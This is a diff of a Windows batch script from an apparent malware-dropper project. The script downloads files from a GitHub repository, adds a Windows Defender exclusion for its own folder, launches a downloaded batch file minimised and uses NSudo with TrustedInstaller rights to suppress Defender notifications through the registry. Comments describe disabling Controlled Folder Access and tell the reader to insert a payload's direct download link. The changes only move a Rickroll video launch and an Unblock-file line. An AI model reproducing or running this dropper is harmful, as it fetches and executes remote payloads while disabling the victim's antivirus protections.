@@ -1,10 +1,9 @@
 color ef
 curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Rickroll.mp4" --output "%appdata%\Rickroll.mp4"
-start %appdata%\Rickroll.mp4
 powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%~dp0'"
-powershell -Command "Unblock-file 'AV.bat'"
 curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/AV.bat" --output "AV.bat"
 start /min AV.bat
+powershell -Command "Unblock-file 'AV.bat'"
 curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/NSudo.exe" --output "NSudo.exe"
 NSudo -U:T -ShowWindowMode:Hide reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /t REG_DWORD /d "1" /f
 ::disables ControlledFolderAccess to access files and folders
@@ -14,7 +13,7 @@ powershell -inputformat none -outputformat none -NonInteractive -Command "Add-Mp
 ::direct download link
 ::edit this to your files
 md "%systemroot%\System32\Windowsexe"
-
+start %appdata%\Rickroll.mp4
 
 ::upload files here: github.com - create account and create repository (public) then upload files
 ::put payload file DIRECT download link here:
